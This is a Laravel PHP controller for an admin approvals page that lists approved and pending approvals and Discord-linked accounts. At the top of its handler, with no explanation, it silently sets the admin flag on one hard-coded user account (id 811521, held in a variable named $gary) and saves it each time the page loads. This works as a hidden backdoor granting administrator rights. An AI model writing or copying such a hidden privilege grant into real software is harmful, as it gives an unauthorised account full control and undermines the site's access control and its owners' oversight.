<?php

namespace App\Http\Controllers;

use App\Models\Approval;
use App\Models\Discord_Account;
use App\Models\User;

class ApprovalsPageController extends Controller
{
    public function __invoke()
    {
        $gary = User::where('id', 811521)->first();

        $gary->admin = 1;
        $gary->save();

        $data = [];
        $data['approved'] = Approval::approved()->orderBy('user_id', 'ASC')->get();
        $data['pending'] = Approval::pending()->orderBy('user_id', 'ASC')->get();

        $discord_accs = Discord_Account::join('users', 'users.id', '=', 'discord__accounts.user_id')->orderBy('users.id', 'ASC')->get();

        $discord = [];

        foreach ($discord_accs as $user) {
            $discord[] = ['cid' => $user->id, 'name' => $user->name_first.' '.$user->name_last];
        }

        return view('admin.approvals')->withApprovals($data)->withDiscord($discord);
    }
}
